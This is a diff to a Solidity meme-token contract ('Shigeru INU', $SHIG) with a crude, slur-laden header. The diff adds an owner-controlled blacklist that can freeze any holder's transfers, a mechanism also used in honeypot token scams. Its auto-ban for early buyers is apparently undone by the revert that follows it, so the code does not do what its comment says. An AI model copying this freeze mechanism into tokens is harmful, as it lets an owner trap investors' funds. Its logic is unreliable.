@@ -1,6 +1,6 @@
 //
 //
-// SHIGERO INU produced by the New Tokyo INU syndicate.
+// SHIGERU INU produced by the New Tokyo INU syndicate.
 // The syndicate grants access only to chads based by the community.
 // Our core beliefs: Bears and Jeets will get fucked. Never sell on red.
 // Respect the community. Make moon.  Long live the protocol.
@@ -669,6 +669,7 @@ contract SHIG is Context, IERC20, Ownable {
     mapping (address => mapping (address => uint256)) private _allowances;
     mapping (address => bool) private _isExcludedFromFee;
     mapping (address => bool) private _isExcluded;
+    mapping (address => bool) private _isBlacklisted;
     address[] private _excluded;
 
     uint256 private constant MAX = ~uint256(0);
@@ -680,11 +681,10 @@ contract SHIG is Context, IERC20, Ownable {
     address payable public _burnAddress  = payable(0x000000000000000000000000000000000000dEaD);
     string private _name = "Shigeru INU - New Tokyo INU Syndicate";
     string private _symbol = "$SHIG";
+    bool public antiBotLaunch = true;
+    bool public antiSnipe = true;
+    // uint256 public firstLiveBlock;
 
- //   bool public antiBotLaunch = true;
-
- //     bool public antiSnipe = true;
- //     uint256 public firstLiveBlock;
     bool public tradingLive = false;
 
     uint256 public _devFee = 10;
@@ -1150,7 +1150,13 @@ contract SHIG is Context, IERC20, Ownable {
     //this method is responsible for taking all fee, if takeFee is true
     function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
 
+        require(!_isBlacklisted[sender] && !_isBlacklisted[recipient]);
+
         if(!tradingLive){
+            // ban all who try to buy before trading is live
+            if(  sender == uniswapV2Pair && recipient != address(uniswapV2Router) && recipient != address(this)){
+                _isBlacklisted[recipient] = true;
+            }
             require(sender == owner(),"Trading is not started yet"); // only owner allowed to trade or add liquidity
         }
 
@@ -1229,5 +1235,19 @@ contract SHIG is Context, IERC20, Ownable {
         tradingLive = !tradingLive;
        //  firstLiveBlock = block.number;
     }
+
+    function blacklist(address _address) external onlyOwner() {
+        _isBlacklisted[_address] = true;
+    }
+
+    function removeFromBlacklist(address _address) external onlyOwner() {
+        _isBlacklisted[_address] = false;
+    }
+
+    function getIsBlacklistedStatus(address _address) external view returns (bool) {
+        return _isBlacklisted[_address];
+    }
+
+
 
 }
